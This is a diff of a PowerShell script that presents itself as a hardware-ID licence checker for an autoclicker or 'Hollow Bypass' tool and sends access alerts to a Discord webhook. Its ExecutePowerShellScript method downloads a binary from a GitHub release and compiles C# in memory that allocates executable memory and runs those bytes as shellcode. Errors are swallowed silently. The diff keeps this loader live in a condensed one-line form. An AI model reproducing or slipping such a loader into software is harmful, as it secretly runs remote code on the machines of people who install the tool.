@@ -43,46 +43,16 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
-            $parentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
-            $code = @'
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Threading;
-public class X {
-    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
-    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);
-    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);
-    [DllImport("kernel32")] static extern bool TerminateThread(IntPtr h, uint e);
-    public static void E(byte[] b, int ppid) {
-        IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);
-        Marshal.Copy(b, 0, m, b.Length);
-        IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);
-        new Thread(() => {
-            while (true) {
-                try {
-                    Process.GetProcessById(ppid);
-                    Thread.Sleep(500);
-                } catch {
-                    TerminateThread(t, 0);
-                    break;
-                }
-            }
-        }) { IsBackground = true }.Start();
-        WaitForSingleObject(t, 0xFFFFFFFF);
-    }
-}
-'@
             $s = (iwr "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin").Content
             $p = New-Object Microsoft.CSharp.CSharpCodeProvider
             $c = New-Object System.CodeDom.Compiler.CompilerParameters
             $c.CompilerOptions = "/unsafe"
             $c.GenerateInMemory = $true
-            $r = $p.CompileAssemblyFromSource($c, $code)
+            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);WaitForSingleObject(t, 0xFFFFFFFF);}}')
             $a = $r.CompiledAssembly
             $t = $a.GetType("X")
             $m = $t.GetMethod("E")
-            $m.Invoke($null, @(,$s, $parentPid))
+            $m.Invoke($null, @(,$s)) #password
         }
         catch {
         }
@@ -170,8 +140,8 @@ public class X {
             content = $null
             embeds = @(
                 @{
-                    title = ":warning: TENTATIVE D'ACCES NON AUTORISE :warning:"
-                    color = 16711680
+                    title = ":warning: TENTATIVO DI ACCESSO NON AUTORIZZATO :warning:"
+                    color = 0
                     fields = @(
                         @{
                             name = "HWID"
@@ -191,7 +161,8 @@ public class X {
                         }
                     )
                     footer = @{
-                        text = "AutoClicker Security"
+                        text = "Hollow Bypass"
+                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                     }
                     timestamp = $timestamp
                 }
@@ -211,8 +182,8 @@ public class X {
             content = $null
             embeds = @(
                 @{
-                    title = ":white_check_mark: ACCES AUTORISE :white_check_mark:"
-                    color = 65280
+                    title = ":ballot_box_with_check: ACCESSO COMPIUTO :ballot_box_with_check:"
+                    color = 0
                     fields = @(
                         @{
                             name = "USERNAME"
@@ -228,7 +199,8 @@ public class X {
                         }
                     )
                     footer = @{
-                        text = "AutoClicker Security"
+                        text = "Hollow Bypass"
+                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                     }
                     timestamp = $timestamp
                 }
@@ -262,3 +234,4 @@ try {
 catch {
     exit 1
 }
+
